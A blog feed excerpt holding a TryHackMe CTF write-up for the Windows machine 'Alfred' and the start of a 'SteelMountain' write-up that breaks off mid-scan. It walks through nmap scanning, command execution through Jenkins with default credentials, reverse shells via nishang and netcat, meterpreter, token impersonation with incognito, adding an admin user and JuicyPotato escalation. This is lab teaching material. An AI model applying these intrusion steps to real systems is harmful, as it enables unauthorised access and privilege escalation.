<p>First we will create a directory with the name of the machine, and with <strong><em>mkt</em></strong> i will create the following directories to be able to organize the files of each one of those directories.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura1.png" />
</p>

<p>mkt is a function that i have defined in the <strong><em>~/.zshrc</em></strong> so that I can create these directories without creating them one by one.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkt () {
        mkdir {nmap,content,exploits,scripts}
}
</code></pre></div></div>

<h2 id="scanning">Scanning</h2>

<p>Let’s start with the nmap scan with the following parameters:</p>

<table>
  <thead>
    <tr>
      <th>Flags</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-sCV (-sC -sV)</td>
      <td>Use nmap recon scripts to discover the version and services that are running each of those ports.</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td>No ping, this machine no response icmp packets so we must assign this flag.</td>
    </tr>
    <tr>
      <td>-oA</td>
      <td>Save the scan in all formats.</td>
    </tr>
  </tbody>
</table>

<p>As we can see on the scan results we have a http running on the port 80 and the jenkins running on the port 8080 (remember that <strong><em>jetty</em></strong> it’s jenkins).</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Nmap 7.92 scan initiated Sun Jul  3 12:26:39 2022 as: nmap -sC -sV -Pn -oA allports 10.10.250.85 
</span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">250.85</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.046</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">997</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>    <span class="n">VERSION</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>       <span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">7.5</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesnt</span> <span class="n">have</span> <span class="n">a</span> <span class="n">title</span> <span class="p">(</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">).</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">7.5</span>
<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">tcpwrapped</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">alfred</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span><span class="n">T16</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">45</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2023</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span><span class="n">T16</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">45</span>
<span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>       <span class="n">Jetty</span> <span class="mf">9.4</span><span class="p">.</span><span class="n">z</span><span class="o">-</span><span class="n">SNAPSHOT</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">robots</span><span class="p">.</span><span class="n">txt</span><span class="p">:</span> <span class="mi">1</span> <span class="n">disallowed</span> <span class="n">entry</span> 
<span class="o">|</span><span class="n">_</span><span class="o">/</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesnt</span> <span class="n">have</span> <span class="n">a</span> <span class="n">title</span> <span class="p">(</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="p">).</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Jetty</span><span class="p">(</span><span class="mf">9.4</span><span class="p">.</span><span class="n">z</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="p">)</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
<span class="c1"># Nmap done at Sun Jul  3 12:27:27 2022 -- 1 IP address (1 host up) scanned in 48.28 seconds
</span></code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>

<p>If we access on the port 80 there is nothing interesting just a foto of burce wayne and a message.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura3.png" />
</p>

<p>So let’s access on the port 8080 where is the jenkin hosted, and for access to the admin panel the credentials are <strong><em>admin:admin</em></strong>. So in this step anything complicated we don’t need brute force it.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura4.png" />
</p>

<p>Once we are in we can see that there is a project created, so click on that project.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura5.png" />
</p>

<p>So one of the things that is very controversial in jenkins is that if we have access we can execute commands on the system, for this we must click on setting icon.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura6.png" />
</p>

<p>So if we scrolling down and where it’s says <strong><em>Execute batch commands</em></strong> we can inject here any system commands, in this case let’s try with “whoami” to see if it’s works, once we put the command that we want to execute just click on <strong><em>save</em></strong>.</p>
<p align="center">
<img src="/assets/images/img-alfred/captura7.png" />
</p>

<p>So if we go back on that project where is says <strong><em>build history</em></strong> is the commands that we execute on this project, for check we can click on that or click on <strong><em>Build now</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura8.png" />
</p>

<p>Then click on the <strong><em>Console output</em></strong> and we can see that the command we set previously is execute it, and we are as a user <strong><em>bruce</em></strong> so we know that this user is who runs the jenkins service.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura9.png" />
</p>

<p>We can do another test using the command “dir” to list the files on the current directory, and as you can see is execute it perfectly.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura10.png" />
</p>

<p>Now we are going to establish a reverse shell and for that we going to using the script <strong><em>Invoke-PowershellTcp.ps1</em></strong> from <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">nishang</a> repo. First let’s create an http server with python to transfer that script to the target machine and in another window is listening with netcat for a connection.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura11.png" />
</p>

<p>Now we are going to do same thing as we done before to execute commands, we are going to use the following command to install the script and get the reverse shell on the listening port in netcat.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura12.png" />
</p>

<p>Now if we go back on the project we can see that the task is processing.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura13.png" />
</p>

<p>Now we move on the console output section we can see that our command is still executing.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura14.png" />
</p>

<p>Now if we look on our netcat listener see that we receive a connection from the target machine, and we have access to the machine.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura15.png" />
</p>

<p>We are as a bruce user so if we move on the bruce desktop folder we can view the first flag which is <strong><em>user.txt</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura16.png" />
</p>

<h2 id="privesc">PrivESC</h2>

<p>So for privilage escalation first we are going to do it using metasploit, so the first thing it’s to create a executable binary with <strong><em>msfvenom</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura17.png" />
</p>

<p>Now we are going to transfer that executable on the target machine with the following commands as we use before.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura18.png" />
</p>

<p>Start the <strong><em>msfconsole</em></strong> and use the module <strong><em>exploit/multi/handler</em></strong> which is used to get connection in metasploit, now set the payload that you used to create the executable and then set the lhost and lport, con use the command <strong><em>run</em></strong> to start listening for the connection.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura19.png" />
</p>

<p>Now on the target machine we are going to run this executable as a process.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura20.png" />
</p>

<p>Now if we back in our msfconsole we receive a connection and we have a meterpreter session, so it’s going be more easy to escalate privilege.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura21.png" />
</p>

<p>In windows systems they use tokens to ensure that accounts have the right privileges to carry out particular actions, account tokens are assigned to an account when users log in on the system or are authenticated. This is usually done by LSASS.exe (think of this as an authentication process). Every process executed on behalf of the user has a copy of the access tokens.</p>

<p>The token identifies the user, the user’s group and user’s privileges, because this access tokens are consists of:</p>

<ul>
  <li>User’s SID’s(security identifier) that identifies the current logon session.</li>
  <li>group SID’s</li>
  <li>privileges</li>
</ul>

<p>We can see all this information using the command <strong><em>whoami /all</em></strong>.</p>

<p>There are two type of access tokens:</p>

<ul>
  <li><strong><em>primary access tokens</em></strong>: those associated with a user account that are genereted on log on.</li>
  <li><strong><em>impersonation tokens</em></strong>: these allow a particular process (or thread in a process) to gain access to resources using the tokens of another (user/client) process.</li>
</ul>

<p>For an impersonation token, there are different levels:</p>

<ul>
  <li><strong><em>SecurityAnonymous</em></strong>: current user/client cannot impersonate another user/client.</li>
  <li><strong><em>SecurityIdentification</em></strong>: current user/client can get the identity and privileges of a client, but cannot impersonate the client.</li>
  <li><strong><em>SecurityImpersonation</em></strong>: current user/client can impersonate the client’s security context on the local system.</li>
  <li><strong><em>SecurityDelegation</em></strong>: Current user/client can impersonate the client’s security context on a remote system.</li>
</ul>

<p>Where the security context is a data structure that contains user’s relevant security information.</p>

<p>The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions on the system. Here is some privileges that we can abused:</p>

<ul>
  <li>SeImpersonatePrivilege (common one)</li>
  <li>SeAssignPrimaryPrivilege</li>
  <li>SeTcbPrivilege</li>
  <li>SeBackupPrivilege</li>
  <li>SeRestorePrivilege</li>
  <li>SeCreateTokenPrivilege</li>
  <li>SeLoadDriverPrivilege</li>
  <li>SeTakeOwnershipPrivilege</li>
  <li>SeDebugPrivilege</li>
</ul>

<p>More info about access tokens in <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens">hacktricks</a> and <a href="https://docs.microsoft.com/es-es/windows/win32/secauthz/access-tokens">microsoft documentation</a>.</p>

<p>Now if we type <strong><em>whoami /priv</em></strong> on target system we can see the privileges that are enabled for the current user, so here we can see that the user bruce have <strong><em>SeImpersonatePrivilege</em></strong> and <strong><em>SeDebugPrivilege</em></strong> enbled.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura22.png" />
</p>

<p>So go back on our meterpreter session we can download on the target system a tool called <strong><em>incognito</em></strong>, this allows us to enumerate tokens and through these tokens we can create new processes, create users, and add users in a specific group, basically is used to impersonate  authentication tokens when we sucessfully comprimised a windows system. In this case we are going to use this tool to expliot this two privileges.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura23.png" />
</p>

<p>Execute the command <strong><em>list_tokens -g</em></strong> to check which tokens are available. We can see that there is a admin token available on the delegation tokens which is the <strong><em>BUILTIN\Administrators</em></strong>, so let’s impersonate this admin token.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura24.png" />
</p>

<p>For impersonating a token on meterpreter use the command <strong><em>impersonate_token</em></strong> and the token that we see previously. And we are NT AUTHORITY\SYSTEM.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura25.png" />
</p>

<p>Even though we have a higher privileged token we may not actually have the permissions of a privileged user. this is due to the way windows handles permissions, it uses the primary token of the process and not the impersonated token to determine what the process can or cannot do. So we need to migrate to a process with correct permissions, the safest process to pick is the <strong><em>services.exe</em></strong> process. First to identify the PID of that process use the command <strong><em>ps</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura26.png" />
</p>

<p>Now migrate to this process using the command <strong><em>Migrate PID-OF-PROCESS</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura27.png" />
</p>

<p>Now we can type shell to get the command propmt and as you can see we are as a NT AUTHORITY\SYSTEM, and we can view the last flag on the following directory.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura28.png" />
</p>

<h2 id="now-without-metasploit">Now without metasploit</h2>

<p>We are going to do the same process to escalate privileges but without using metasploit, so first download the incognito tool on the following url and unzip it.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura29.png" />
</p>

<p>Now let’s get a reverse shell using the netcat binary to avoid some issues.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura30.png" />
</p>

<p>Now we are going to do the same process as we done previously to get reverse shell, we are going to use <strong><em>certutil.exe</em></strong> to download the netcat binary on the target machine, And we are going to save it on the tmp folder.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura31.png" />
</p>

<p>Go back on the <strong><em>console output</em></strong> section and check if the command it’s executed correctly.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura32.png" />
</p>

<p>Now once transfer the netcat binary now we are going to get a reverse shell.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura33.png" />
</p>

<p>Now if we check on <strong><em>build now</em></strong> we can see that it’s processing to execute the command.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura34.png" />
</p>

<p>If we go back on our netcat listener we get a connection from the target machine.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura35.png" />
</p>

<p>Now inside of the incognito folder that we unzip before we are going to transfer the <strong><em>incognito.exe</em></strong> on the target machine with smb (or if you want you can do it using python).</p>

<p align="center">
<img src="/assets/images/img-alfred/captura36.png" />
</p>

<p>So the command that we are going to use on incognito is the same commands that we use on the meterpreter, so as you can see you can list available tokens using the command <strong><em>list_tokens</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura37.png" />
</p>

<p>If we execute just the binary we can see the options that offers incognito.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura38.png" />
</p>

<p>First we are going to create a user with incognito (you can skip this part if you want, but i recommend to create a test user).</p>

<p align="center">
<img src="/assets/images/img-alfred/captura39.png" />
</p>

<p>So as you can see that the user that i created is not assigned in any group on the system.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura40.png" />
</p>

<p>And now what we are going to do is add that user on the admins group using the flag <strong><em>add_localgroup_user</em></strong>, and with that the user it should be added on the admins group. Remember that incognito can do that because it’s taking advantage of those privilege tokens that we seen before with the command “whoami /priv”.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura41.png" />
</p>

<p>As you can see the user “attacker” is added on the admins group, so now if we switch with that user we are going to have admin privileges on the system.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura42.png" />
</p>

<p>So on our nmap scan we see that rdp is available, so with <strong><em>rdesktop</em></strong> let’s access on the target machine with the user thar we created with incognito.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura43.png" />
</p>

<p>And i am in as a user attacker and we can see that i am using cmd as an administrator.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura44.png" />
</p>

<h2 id="privesc-using-juicypotato">PrivESC using juicypotato</h2>

<p>In the case that we have the permission <strong><em>SeImpersonatePrivilege</em></strong> enabled we can exploit it and escalate privilages using a tool called <strong><em>juicypotato</em></strong>, which is a tool to exploit windows service accounts impersionating privileges. This tool takes advantages of the <strong><em>SeImpersonatePrivilege</em></strong> or <strong><em>SeAssignPrimaryTokenPrivilege</em></strong> if enabled on the machine to elevate the local privileges to System. Normally, these privileges are assigned to service users, admins, and local systems, if the machine is running IIS or SQL service, these privileges will be enabled by default. So let’s download it on the following <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">repo</a>.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura45.png" />
</p>

<p>Then transfer the binary on the target machine.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura46.png" />
</p>

<p>Now if we execute the juicypotato.exe we can see the options or flags that we can use with this tool.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura47.png" />
</p>

<p>Now we are going to take advantage the netcat binary that we transfer before to get a privileged reverse shell, with the flag <strong><em>-l</em></strong> specify the COM server, the flag <strong><em>-p</em></strong> is used to execute a program in this case we want “cmd.exe”, the flag <strong><em>-a</em></strong> is the command line argument to pass to that program (in our case it will be to establish a reverse shell on our attacker machine) and the <strong><em>-t</em></strong> flag is used to createprocess call and if we add the * it’s going to use <strong><em>CreateProcessWithW</em></strong> and <strong><em>CreateProcessAsuser</em></strong>. More info <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">here</a>.</p>

<p>And once we execute that juicypotato with those options we can receive a connection in our netcat listener and as you can see we are as a <strong><em>nt authority\system</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-alfred/captura48.png" />
</p>

<h2 id="conclusion">Conclusion</h2>

<p>If you are new doing ctf’s i highly recommend doing this machine because it’s touch fundamentals things like windows access tokens and how to exploit them, and services that may be exposed and exploited.</p>]]></content><author><name>bynafrez</name></author><category term="CTF" /><category term="Web" /><category term="Tryhackme" /><category term="Windows" /><category term="Jenkins" /><category term="Windows access tokens" /><summary type="html"><![CDATA[Alfred is a windows machine which has jenkins installed on the port 8080 and the first step is to exploit it and gain access to the machine, and in privilege escalation we are going to be exploiting the windows authentication tokens we are going exploit this in two ways, the first is using metasploit and then manually.]]></summary></entry><entry><title type="html">THM - SteelMountain</title><link href="http://0.0.0.0:4000/thm-steelMountain/" rel="alternate" type="text/html" title="THM - SteelMountain" /><published>2022-08-02T00:00:00-04:00</published><updated>2022-08-02T00:00:00-04:00</updated><id>http://0.0.0.0:4000/thm-steelMountain</id><content type="html" xml:base="http://0.0.0.0:4000/thm-steelMountain/"><![CDATA[<p>Steelmountain is windows machine inspired by the mr.robot serie, first we have a little osint challenge we need to indentify the person on the image on the website, then we exploit the CVE-2014-6287  to gain access to the target machine and finally we utilise powershell for privESC enumeration to gain access as a admin.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/portada.jpeg" />
</p>

<p>First we going to create a directory with the name of the target machine and inside of that directory with <strong><em>mkt</em></strong> we going to create the following directories to organize the content.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura1.png" />
</p>

<p>mkt is a function that i have defined on my <strong><em>~/.zshrc</em></strong>, the function is the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkt(){
	mkdir {nmap,content,exploits,scripts}
  }
</code></pre></div></div>

<p>And if we send one icmp trace on the target machine we receive a connection, and remember that the linux machine have 64 TTL and windows have 128 TTL and sometimes this values can decrease one digit or more and this because of traceroute. we can check this by using the flag <strong><em>-R</em></strong> on the ping command, in the case of windows this flag doesn’t apply.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura2.png" />
</p>

<h2 id="scanning">Scanning</h2>

<p>This is the nmap scan result with the following ports that i have discovered with a previous scan. We can see the following ports with versions of the services and the nmap scan reports us that the smb is not signed, so this can be useful to enumerate hosts or the target machine with the smb protocol.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Nmap 7.92 scan initiated Fri May 27 17:11:26 2022 as: nmap -sCV -p80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49163,49164 -oN targeted 10.10.97.160
</span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">97.160</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.046</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>

<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>            <span class="n">VERSION</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>               <span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">8.5</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesnt</span> <span class="n">have</span> <span class="n">a</span> <span class="n">title</span> <span class="p">(</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">).</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">8.5</span>
<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>        <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>       <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="o">-</span> <span class="mi">2012</span> <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span><span class="err">?</span>
<span class="o">|</span> <span class="n">rdp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">Target_Name</span><span class="p">:</span> <span class="n">STEELMOUNTAIN</span>
<span class="o">|</span>   <span class="n">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="n">STEELMOUNTAIN</span>
<span class="o">|</span>   <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">STEELMOUNTAIN</span>
<span class="o">|</span>   <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">steelmountain</span>
<span class="o">|</span>   <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">steelmountain</span>
<span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">6.3</span><span class="p">.</span><span class="mi">9600</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">System_Time</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">52</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">steelmountain</span>
<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">26</span><span class="n">T20</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">40</span>
<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">25</span><span class="n">T20</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">40</span>
<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">57</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">2</span><span class="n">s</span> <span class="k">from</span> <span class="n">scanner</span> <span class="n">time</span><span class="p">.</span>
<span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>               <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span>
<span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>               <span class="n">HttpFileServer</span> <span class="n">httpd</span> <span class="mf">2.3</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">HFS</span> <span class="mf">2.3</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">HFS</span> <span class="o">/</span>
<span class="mi">47001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>               <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span>
<span class="mi">49152</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49153</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49155</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49156</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49163</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="mi">49164</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OSs</span><span class="p">:</span> <span class="n">Windows</span><span class="p">,</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="o">-</span> <span class="mi">2012</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>

<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
